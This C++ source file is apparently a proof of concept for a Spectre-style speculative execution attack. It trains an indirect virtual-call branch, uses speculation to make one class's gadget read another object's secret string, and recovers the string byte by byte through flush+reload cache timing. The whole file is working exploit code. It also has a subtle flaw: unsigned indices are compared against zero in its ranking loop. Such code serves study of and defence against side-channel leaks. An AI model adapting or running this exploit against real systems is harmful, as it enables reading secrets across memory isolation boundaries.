#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h>
#include <ctype.h>
#include <time.h>

#define N 1000

#define TRAINING 1000

#define CACHE_LINES  256
#define CACHE_SLICES 4096

#define SECRET_SIZE 45

#define CACHE_HIT_THRESHOLD 80

uint8_t detector[CACHE_LINES * CACHE_SLICES];

size_t cache_hits[CACHE_LINES];

class Animal {
    public:
        virtual void move(int idx) {
        }
};

class Bird : public Animal {
    private:
        char const* secret;
    public:
        Bird() {
            secret = "A secret between three is everybodies secret.";
        }
        void move(int idx) {
            // nop
        }
};

class Fish : public Animal {
    private:
        char const* data; 
    public:
        Fish() {
            data = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam";
        }
        void move(int idx) {
            uint32_t junk;
            junk = detector[data[idx] * CACHE_SLICES];
        }
};

void move_animal(Animal* animal, size_t idx) {
    animal->move(idx);
}

void delay() {
    for (volatile size_t i=0; i < 100; ++i);
}

void train(Animal* animal, size_t idx) {
    for(int j = 0; j < TRAINING; j++)
      move_animal(animal, idx);
}

void readbyte(size_t idx, Animal* fish, Animal* bird, uint8_t* value, ssize_t* score) {
    uint32_t junk;
    uint64_t t1, t2;
    size_t j, k;

    for (size_t i=0; i < CACHE_LINES; ++i)
        cache_hits[i] = 0;

    for (size_t n=0; n < N; ++n) {

        train(fish, idx);

        for (size_t i=0; i < CACHE_LINES; ++i)
            _mm_clflush(&detector[i * CACHE_SLICES]);

        delay();

        move_animal(bird, idx);

        for(int i = 0; i < CACHE_LINES; i++) {
            t1 = __rdtscp(&junk);
            junk = detector[i * CACHE_SLICES];
            t2 = __rdtscp(&junk);

            if ((t2-t1) < CACHE_HIT_THRESHOLD)
                ++cache_hits[i];
        }

        j = k = -1;
        for (size_t i=0; i < CACHE_LINES; ++i)
            if (j < 0 || cache_hits[j] < cache_hits[i])
                k = j, j = i;
            else if (k < 0 || cache_hits[k] < cache_hits[i])
                k = i;

        if (cache_hits[j] >= (2 * cache_hits[k] + 5) ||
           (cache_hits[j] == 2 && cache_hits[k] == 0))
            break;       
    }
    
    value[0] = j;
    score[0] = cache_hits[j];
}

int main(int argc, char* argv[]) {
    uint8_t value;
    ssize_t score;

    for (size_t i=0; i < sizeof(detector); ++i)
        detector[i] = 0;

    Fish* fish = new Fish();
    Bird* bird = new Bird();
    
    for (size_t idx=0; idx < SECRET_SIZE; ++idx) {
        readbyte(idx, fish, bird, &value, &score);
        printf("%#02x='%c'\n", value, (isascii(value) ? value : '?'));
    }

    return EXIT_SUCCESS;
}
